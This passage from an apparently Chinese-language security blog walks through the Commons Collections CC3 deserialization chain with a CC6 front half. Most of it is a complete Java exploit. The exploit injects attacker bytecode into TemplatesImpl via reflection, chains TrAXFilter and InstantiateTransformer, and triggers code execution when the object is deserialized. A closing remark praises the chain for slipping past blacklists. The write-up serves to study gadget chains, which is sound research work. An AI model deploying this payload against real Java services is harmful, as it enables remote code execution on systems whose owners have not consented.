}
```

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/CC3EXP1.png)

#### CC6 链作为前半部分

- 如法炮制

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// 用 CC6 链的前半部分链子  
public class CC3FinalEXP2 {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  
 instantiateTransformer  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器  
 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");  
 HashMap<Object, Object> expMap = new HashMap<>();  
 expMap.put(tiedMapEntry, "value");  
 lazyMap.remove("key");  
  
 // 在 put 之后通过反射修改值  
 Class<LazyMap> lazyMapClass = LazyMap.class;  
 Field factoryField = lazyMapClass.getDeclaredField("factory");  
 factoryField.setAccessible(true);  
 factoryField.set(lazyMap, chainedTransformer);  
  
 serialize(expMap);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/CC3EXP2.png)

## 0x08 小结

- CC3 链作为另外一种命令执行的方式，在原本黑名单的机会当中溜了出来，确实牛逼。

按照惯例整理一下流程图，不过这次的流程图打算和 CC1，CC6 放一起。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ALLCC.png)